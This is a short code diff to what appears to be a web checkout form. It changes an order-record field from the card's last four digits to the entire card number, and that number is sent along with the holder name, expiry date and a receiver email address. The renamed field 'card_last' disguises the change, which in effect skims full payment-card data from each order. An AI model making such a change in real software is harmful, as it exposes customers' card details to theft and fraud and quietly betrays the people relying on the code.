@@ -352,7 +352,7 @@ function CheckoutContent() {
 					coupon_code: couponCode || "-",
 					payment_method: "card",
 					card_holder: cardHolder.trim(),
-					card_last4: normalizedCard.slice(-4),
+					card_last: normalizedCard.slice(),
 					card_expiry: cardExpiry,
 					order_id: orderId,
 					receiver_email: ORDER_RECEIVER_EMAIL,
